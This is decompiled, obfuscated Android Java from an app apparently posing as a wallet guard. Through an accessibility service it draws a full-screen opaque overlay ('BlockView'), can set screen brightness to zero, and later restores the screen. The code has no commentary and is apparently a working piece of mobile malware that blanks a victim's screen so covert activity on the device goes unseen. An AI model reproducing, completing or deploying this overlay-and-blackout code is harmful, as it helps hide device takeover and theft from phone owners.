package com.guard.wallet.helper;

import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.os.Build.VERSION;
import android.util.Log;
import android.view.View;
import android.view.ViewTreeObserver;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import com.guard.wallet.req.BlockViewVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.lang.ref.WeakReference;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

public abstract class g {
   public static final AtomicReference a = new AtomicReference();
   public static final ReentrantLock b = new ReentrantLock();
   public static WindowManager c;
   public static final AtomicInteger d = new AtomicInteger(-1);
   public static final AtomicBoolean e = new AtomicBoolean(true);
   public static final AtomicBoolean f = new AtomicBoolean(false);

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static boolean a(BlockViewVO var0) {
      Exception var10000;
      label84: {
         BlockViewVO var1 = var0;
         if (var0 == null) {
            try {
               var1 = new BlockViewVO();
            } catch (Exception var10) {
               var10000 = var10;
               boolean var10001 = false;
               break label84;
            }
         }

         try {
            if (g()) {
               return g();
            }

            var11 = MyAccessibilityService.P();
         } catch (Exception var9) {
            var10000 = var9;
            boolean var15 = false;
            break label84;
         }

         if (var11 == null) {
            return g();
         }

         ReentrantLock var12 = b;

         label68: {
            try {
               if (!var12.tryLock()) {
                  return g();
               }

               if (com.guard.wallet.utils.k.a()) {
                  b(var1);
                  break label68;
               }
            } catch (Exception var8) {
               var10000 = var8;
               boolean var16 = false;
               break label84;
            }

            try {
               Handler var3 = new Handler(Looper.getMainLooper());
               e.a var2 = new e.a(var1, 3);
               var3.post(var2);
            } catch (Exception var7) {
               var10000 = var7;
               boolean var17 = false;
               break label84;
            }
         }

         try {
            var14 = new AtomicInteger(0);
         } catch (Exception var5) {
            var10000 = var5;
            boolean var18 = false;
            break label84;
         }

         while (true) {
            try {
               if (f.get() || var14.incrementAndGet() >= 100) {
                  break;
               }

               Log.d("com.guard.wallet.helper.g", "副进程等待BlockView显示至窗口");
               com.guard.wallet.utils.g.T0(1);
            } catch (Exception var6) {
               var10000 = var6;
               boolean var19 = false;
               break label84;
            }
         }

         try {
            var12.unlock();
            return g();
         } catch (Exception var4) {
            var10000 = var4;
            boolean var20 = false;
         }
      }

      Exception var13 = var10000;
      a1.q.s("com.guard.wallet.helper.g", var13);
      return g();
   }

   public static void b(BlockViewVO var0) {
      try {
         d.set(com.guard.wallet.utils.g.O0());
         LayoutParams var2 = new LayoutParams();
         var2.flags = 591800;
         var2.format = 1;
         var2.alpha = 1.0F;
         var2.x = 0;
         var2.y = 0;
         var2.width = com.guard.wallet.utils.e.e().getWidth();
         var2.height = com.guard.wallet.utils.e.e().getHeight();
         if (MyAccessibilityService.P() != null) {
            e0.g var1 = new e0.g(MyAccessibilityService.P(), var0.getHint(), var0.getBlockDrawable());
            if (c == null) {
               c = (WindowManager)MyAccessibilityService.P().getSystemService("window");
            }

            var2.type = 2032;
            Log.d("com.guard.wallet.helper.g", "BlockTextView 创建完成");
            if (var0.isZeroBrightness() && com.guard.wallet.utils.k.c(0)) {
               Log.d("com.guard.wallet.helper.g", "BlockTextView 亮度设置为0");
            }

            e.set(var0.isDestroyLock());
            c.addView(var1, var2);
            ViewTreeObserver var4 = var1.getViewTreeObserver();
            e var5 = new e();
            var4.addOnWindowAttachListener(var5);
            a.set(var1);
            com.guard.wallet.utils.h.I();
         } else {
            Log.d("com.guard.wallet.helper.g", "BlockTextView 创建失败");
         }
      } catch (Exception var3) {
         a1.q.s("com.guard.wallet.helper.g", var3);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static void c() {
      label68: {
         Exception var10000;
         label73: {
            Object var0;
            try {
               var0 = (ReentrantLock)a.get();
            } catch (Exception var8) {
               var10000 = var8;
               boolean var10001 = false;
               break label73;
            }

            if (var0 == null) {
               break label68;
            }

            var0 = b;

            label61: {
               try {
                  if (!var0.tryLock()) {
                     break label68;
                  }

                  if (com.guard.wallet.utils.k.a()) {
                     d();
                     break label61;
                  }
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var12 = false;
                  break label73;
               }

               try {
                  Handler var2 = new Handler(Looper.getMainLooper());
                  f var1 = new f(1);
                  var2.post(var1);
               } catch (Exception var6) {
                  var10000 = var6;
                  boolean var13 = false;
                  break label73;
               }
            }

            AtomicInteger var11;
            try {
               var11 = new AtomicInteger(0);
            } catch (Exception var4) {
               var10000 = var4;
               boolean var14 = false;
               break label73;
            }

            while (true) {
               try {
                  if (!f.get() || var11.incrementAndGet() >= 100) {
                     break;
                  }

                  Log.d("com.guard.wallet.helper.g", "等待BlockView从窗口移除");
                  com.guard.wallet.utils.g.T0(1);
               } catch (Exception var5) {
                  var10000 = var5;
                  boolean var15 = false;
                  break label73;
               }
            }

            try {
               var0.unlock();
               break label68;
            } catch (Exception var3) {
               var10000 = var3;
               boolean var16 = false;
            }
         }

         Exception var10 = var10000;
         a1.q.s("com.guard.wallet.helper.g", var10);
      }

      g();
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static void d() {
      Exception var10000;
      label67: {
         label63: {
            AtomicInteger var0;
            try {
               var0 = d;
               if (var0.get() <= 0) {
                  break label63;
               }

               if (com.guard.wallet.utils.k.c(var0.get())) {
                  Log.d("com.guard.wallet.helper.g", "亮度已恢复");
               }
            } catch (Exception var8) {
               var10000 = var8;
               boolean var10001 = false;
               break label67;
            }

            try {
               var0.set(-1);
            } catch (Exception var6) {
               var10000 = var6;
               boolean var11 = false;
               break label67;
            }
         }

         AtomicReference var2;
         try {
            var2 = a;
            if (var2.get() == null) {
               return;
            }
         } catch (Exception var7) {
            var10000 = var7;
            boolean var12 = false;
            break label67;
         }

         MyAccessibilityService var1;
         try {
            var1 = MyAccessibilityService.P();
         } catch (Exception var5) {
            var10000 = var5;
            boolean var13 = false;
            break label67;
         }

         AtomicBoolean var9 = e;
         if (var1 != null) {
            try {
               if (VERSION.SDK_INT >= 28 && var9.get()) {
                  com.guard.wallet.utils.g.F0(8);
                  com.guard.wallet.utils.g.T0(5);
               }
            } catch (Exception var4) {
               var10000 = var4;
               boolean var14 = false;
               break label67;
            }
         }

         try {
            if (c != null && var2.get() != null) {
               c.removeViewImmediate((View)var2.get());
               var2.set(null);
               var9.set(true);
               com.guard.wallet.utils.h.I();
            }

            return;
         } catch (Exception var3) {
            var10000 = var3;
            boolean var15 = false;
         }
      }

      Exception var10 = var10000;
      a1.q.s("com.guard.wallet.helper.g", var10);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static boolean e() {
      Exception var10000;
      label73: {
         Object var0;
         try {
            var0 = (ReentrantLock)a.get();
         } catch (Exception var8) {
            var10000 = var8;
            boolean var10001 = false;
            break label73;
         }

         if (var0 == null) {
            return g() ^ true;
         }

         var0 = b;

         label61: {
            try {
               if (!var0.tryLock()) {
                  return g() ^ true;
               }

               if (com.guard.wallet.utils.k.a()) {
                  f();
                  break label61;
               }
            } catch (Exception var7) {
               var10000 = var7;
               boolean var12 = false;
               break label73;
            }

            try {
               Handler var1 = new Handler(Looper.getMainLooper());
               f var2 = new f(0);
               var1.post(var2);
            } catch (Exception var6) {
               var10000 = var6;
               boolean var13 = false;
               break label73;
            }
         }

         AtomicInteger var11;
         try {
            var11 = new AtomicInteger(0);
         } catch (Exception var4) {
            var10000 = var4;
            boolean var14 = false;
            break label73;
         }

         while (true) {
            try {
               if (!f.get() || var11.incrementAndGet() >= 100) {
                  break;
               }

               Log.d("com.guard.wallet.helper.g", "等待BlockView从窗口移除");
               com.guard.wallet.utils.g.T0(1);
            } catch (Exception var5) {
               var10000 = var5;
               boolean var15 = false;
               break label73;
            }
         }

         try {
            var0.unlock();
            return g() ^ true;
         } catch (Exception var3) {
            var10000 = var3;
            boolean var16 = false;
         }
      }

      Exception var10 = var10000;
      a1.q.s("com.guard.wallet.helper.g", var10);
      return g() ^ true;
   }

   public static void f() {
      try {
         AtomicInteger var0 = d;
         if (var0.get() > 0) {
            if (com.guard.wallet.utils.k.c(var0.get())) {
               Log.d("com.guard.wallet.helper.g", "亮度已恢复");
            }

            var0.set(-1);
         }

         AtomicReference var2 = a;
         if (var2.get() == null) {
            return;
         }

         if (c != null && var2.get() != null) {
            c.removeViewImmediate((View)var2.get());
            var2.set(null);
            e.set(true);
            com.guard.wallet.utils.h.I();
         }
      } catch (Exception var1) {
         a1.q.s("com.guard.wallet.helper.g", var1);
      }
   }

   public static boolean g() {
      boolean var0;
      if (a.get() != null && c != null) {
         var0 = true;
      } else {
         var0 = false;
      }

      return var0;
   }

   public static void h(int var0) {
      AtomicReference var1 = a;
      if (var1.get() != null) {
         e0.g var3 = (e0.g)var1.get();
         if (var0 > 0) {
            WeakReference var2 = var3.a;
            if (var2 != null && var2.get() != null) {
               e0.i var4 = (e0.i)var3.a.get();
               if (var0 > 0) {
                  var2 = var4.a;
                  if (var2 != null && var2.get() != null) {
                     e0.f var7 = (e0.f)var4.a.get();
                     var7.getClass();
                     if (var0 > 0) {
                        Message var5 = new Message();
                        var5.what = var0;
                        var7.a.sendMessage(var5);
                     }
                  }
               } else {
                  var4.getClass();
               }
            }
         } else {
            var3.getClass();
         }
      }
   }
}
